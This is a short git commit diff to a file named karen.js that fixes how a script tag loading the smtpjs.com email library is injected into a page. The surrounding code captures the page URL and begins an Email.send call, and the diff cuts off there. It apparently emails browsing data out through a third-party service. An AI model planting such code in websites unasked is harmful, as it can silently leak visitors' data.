ce65e92ff2a56099ba00134baf21b7aa0ab14138
Baraker42 <70022095+Baraker42@users.noreply.github.com>
2021-10-11 13:19:35 +0200

    Update karen.js

--- karen.js
+++ karen.js
@@ -1,7 +1,7 @@
-callScript = document.createElement("script");
-callScript.setAttribute("src","https://smtpjs.com/v3/smtp.js">
-//<script src="https://smtpjs.com/v3/smtp.js"></script>
-document.head.appendChild(callScript);
+var sc = document.createElement("script");
+sc.setAttribute("src", "https://smtpjs.com/v3/smtp.js");
+sc.setAttribute("type", "text/javascript");
+document.head.appendChild(sc);
   website = window.location.href
     function sendEmail() {
       Email.send({
